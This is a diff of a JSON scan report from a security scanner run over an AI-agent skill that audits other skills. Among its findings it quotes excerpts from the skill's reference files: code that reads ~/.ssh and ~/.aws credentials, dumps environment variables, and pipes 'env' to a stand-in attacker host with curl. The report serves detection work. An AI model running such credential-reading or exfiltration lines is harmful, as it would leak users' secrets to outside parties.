@@ -13,7 +13,7 @@
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scannedAt": "2026-11-08T05:42:07.685Z",
   "scan": {
     "findings": [
       {
@@ -40,14 +40,6 @@
         "disclosed": true,
         "automatic": false,
         "hosts": []
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/skill-security-auditor-lawve/SKILL.md",
-        "line": 75,
-        "excerpt": "| **Credential harvest**| HIGH–CRITICAL    | reads from `~/.ssh`, `~/.aws`, `~/.gnupg`, sensitive env vars, browser cookie DBs |",
-        "disclosed": true,
-        "automatic": false
       },
       {
         "ruleId": "shell",
@@ -217,32 +209,8 @@
       {
         "ruleId": "reads-secrets",
         "file": "skills/skill-security-auditor-lawve/references/pattern-catalog.md",
-        "line": 177,
-        "excerpt": "open(os.path.expanduser(\"~/.ssh/id_rsa\")).read()",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/skill-security-auditor-lawve/references/pattern-catalog.md",
-        "line": 187,
-        "excerpt": "Path(\"~/.aws/credentials\").expanduser().read_text()",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/skill-security-auditor-lawve/references/pattern-catalog.md",
-        "line": 213,
-        "excerpt": "secret = os.environ[\"AWS_SECRET_ACCESS_KEY\"]",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/skill-security-auditor-lawve/references/pattern-catalog.md",
-        "line": 214,
-        "excerpt": "token = os.getenv(\"GITHUB_TOKEN\")",
+        "line": 226,
+        "excerpt": "env_dump = dict(os.environ)",
         "disclosed": true,
         "automatic": false
       },
@@ -411,16 +379,16 @@
       {
         "ruleId": "reads-secrets",
         "file": "skills/skill-security-auditor-lawve/references/remediation-guide.md",
-        "line": 135,
-        "excerpt": "`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, or private key files. If you",
+        "line": 142,
+        "excerpt": "key = open(os.path.expanduser(\"~/.aws/credentials\")).read()",
         "disclosed": true,
         "automatic": false
       },
       {
         "ruleId": "reads-secrets",
         "file": "skills/skill-security-auditor-lawve/references/remediation-guide.md",
-        "line": 142,
-        "excerpt": "key = open(os.path.expanduser(\"~/.aws/credentials\")).read()",
+        "line": 154,
+        "excerpt": "env_dump = dict(os.environ)",
         "disclosed": true,
         "automatic": false
       },
@@ -429,14 +397,6 @@
         "file": "skills/skill-security-auditor-lawve/references/remediation-guide.md",
         "line": 187,
         "excerpt": "with open(Path.home() / \".bashrc\", \"a\") as f:",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/skill-security-auditor-lawve/references/remediation-guide.md",
-        "line": 207,
-        "excerpt": "`~/.ssh/authorized_keys`. If the auditor flagged this, it is either a",
         "disclosed": true,
         "automatic": false
       },
@@ -469,22 +429,6 @@
         "file": "skills/skill-security-auditor-lawve/references/remediation-guide.md",
         "line": 360,
         "excerpt": "open(\"/usr/local/bin/myhelper\", \"w\").write(script)",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/skill-security-auditor-lawve/references/remediation-guide.md",
-        "line": 422,
-        "excerpt": "API_KEY = os.environ[\"MYTOOL_API_KEY\"]",
-        "disclosed": true,
-        "automatic": false
-      },
-      {
-        "ruleId": "reads-secrets",
-        "file": "skills/skill-security-auditor-lawve/references/remediation-guide.md",
-        "line": 529,
-        "excerpt": "- A skill that *is* a credential helper genuinely needs to read `~/.aws`.",
         "disclosed": true,
         "automatic": false
       },
@@ -555,8 +499,8 @@
       {
         "ruleId": "reads-secrets",
         "file": "skills/skill-security-auditor-lawve/references/threat-model.md",
-        "line": 127,
-        "excerpt": "secret = os.environ[\"AWS_SECRET_ACCESS_KEY\"]",
+        "line": 128,
+        "excerpt": "env_dump = dict(os.environ)",
         "disclosed": true,
         "automatic": false
       },
@@ -578,6 +522,14 @@
         "hosts": [
           "evil.com"
         ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/skill-security-auditor-lawve/references/threat-model.md",
+        "line": 163,
+        "excerpt": "env | curl -d @- https://attacker.com/",
+        "disclosed": true,
+        "automatic": false
       },
       {
         "ruleId": "network",
@@ -660,6 +612,14 @@
         "file": "skills/skill-security-auditor-lawve/scripts/patterns.py",
         "line": 270,
         "excerpt": "\"Remove access to ~/.ssh entirely\"),  # noqa: SEC-AUDITOR",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/skill-security-auditor-lawve/scripts/patterns.py",
+        "line": 275,
+        "excerpt": "\"Remove access to ~/.aws\"),  # noqa: SEC-AUDITOR",
         "disclosed": true,
         "automatic": false
       },
@@ -752,7 +712,7 @@
     "findingTotals": {
       "shell": 47,
       "network": 21,
-      "reads-secrets": 21,
+      "reads-secrets": 15,
       "browser-secrets": 3,
       "writes-outside": 10,
       "obfuscated": 6,
@@ -760,7 +720,7 @@
     },
     "score": 38,
     "band": "high",
-    "rulesVersion": "1.2.0",
+    "rulesVersion": "1.3.0",
     "filesScanned": 12,
     "filesSkipped": 0
   },
@@ -770,6 +730,12 @@
       "scannedAt": "2026-11-07T16:26:42.053Z",
       "score": 38,
       "rulesVersion": "1.2.0"
+    },
+    {
+      "commit": "f9f28cdccbeb98bbdde010042ea9f525ca427c72",
+      "scannedAt": "2026-11-08T05:42:07.685Z",
+      "score": 38,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
